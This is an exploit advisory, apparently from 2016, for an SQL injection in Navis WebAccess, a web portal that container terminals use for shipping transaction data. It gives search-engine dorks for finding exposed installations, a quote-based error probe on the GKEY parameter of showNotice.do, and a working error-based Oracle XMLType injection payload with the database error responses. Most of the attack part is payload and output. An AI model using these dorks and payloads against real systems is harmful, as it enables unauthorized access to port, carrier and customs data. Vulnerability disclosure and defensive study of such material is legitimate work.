@@ -1,0 +1,58 @@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+ 
+Product -> Navis WebAccess - SQL Injection
+Date -> 8/8/2016
+Author -> bRpsd
+Skype: vegnox
+Vendor HomePage -> http://www.navis.com/
+Product Download -> http://navis.com/pr_webaccess.jsp (currently under maintenance)
+Product Version -> Express/All
+DBMS -> Oracle
+Tested on > Apache/2.0.54 (Win32)
+
+ 
+{{ Dorks }}
+
+"Copyright © 2016 Navis, A Zebra Technologies Company"
+"Confidential Information of Navis, A Zebra Technologies Company"
+inurl:GKEY= ext:do
+inurl:/express/secure/Today.jsp
+navis.com webaccess
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+ 
+ #############
+ |DESCRIPTION|
+ #############
+"Navis WebAccess is a web-based application that provides all parties across the terminal with an easy-to-use web browser interface for accessing a wealth of transaction data that was previously inaccessible from outside the terminal. All terminal constitiuents, including shipping lines, trucking companies, port authorities, government agencies, agents, shippers, consignees, distribution centers and depots are better served with 24/7 access to real-time container, vessel and truck transaction information. Users can view load and discharge lists, reports, and EDO details as well as view and make appointments, set and release holds, download and upload EDI files and pay for demurrage."
+
+ 
+ 
+Vulnerability: SQL Injection
+File: /express/showNotice.do
+Vul Parameter: GKEY
+
+ 
+================================================================================================
+Test #1
+
+http://localhost:9000/express/showNotice.do?report_type=1&GKEY=2'
+ 
+ 
+Response Error:
+
+ORA-00933: SQL command not properly ended
+================================================================================================
+
+
+Test #2 => Payload (Proof Of Concept)
+
+http://localhost:9000/express/showNotice.do?report_type=1&GKEY=2 AND 9753=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(118)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9753=9753) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(107)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)
+
+
+Response Error:
+
+ORA-00600: internal error code, arguments: [733], [277608912], [pga heap], [], [], [], [], [], [], [], [], [] ORA-06512: at "SYS.XMLTYPE", line 310 ORA-06512: at line 1
+======================================================================================================================================================================================
+
+~
